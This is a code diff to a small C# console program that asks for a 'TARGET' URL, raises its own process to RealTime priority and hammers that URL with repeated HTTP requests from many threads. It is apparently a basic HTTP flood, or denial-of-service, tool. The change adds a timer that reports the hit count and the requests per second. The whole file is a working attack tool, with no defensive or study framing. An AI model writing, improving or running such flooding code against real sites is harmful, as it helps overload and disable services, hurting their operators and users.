@@ -3,13 +3,24 @@ using System.Net;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Diagnostics;
+using System.Timers;
 
 namespace MyTasks
 {
     public class Program
     {
+        private static int count = 0;
+        private static int countElapsed = 0;
+        private static int speed = 0;
+        private static int timerInterval = 1000;
+
         static void Main()
         {
+            System.Timers.Timer timer = new System.Timers.Timer();
+            timer.Interval = timerInterval;
+            timer.Elapsed += OnTimedEvent;
+            timer.AutoReset = true;
+
             Console.Write("URL name of TARGET (Example https://www.google.com/): ");
             string url = Console.ReadLine();
 
@@ -19,7 +30,6 @@ namespace MyTasks
             using (Process p = Process.GetCurrentProcess())
                 p.PriorityClass = ProcessPriorityClass.RealTime;
 
-            int count = 0;
 
             Thread[] threads = new Thread[numOfThreads];
 
@@ -35,7 +45,7 @@ namespace MyTasks
                             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                             HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                             ++count;
-                            Console.WriteLine(count);
+                            Console.WriteLine($"Hitted: {count}\tSpeed: {speed}/sec");
                         }
                         catch (Exception e)
                         {
@@ -45,10 +55,18 @@ namespace MyTasks
                 });
             });
 
+            timer.Enabled = true;
+
             Parallel.ForEach(threads, (i) =>
             {
                 i.Start();
             });
+        }
+
+        private static void OnTimedEvent(object source, ElapsedEventArgs e)
+        {
+            speed = count - countElapsed;
+            countElapsed = count;
         }
     }
 }
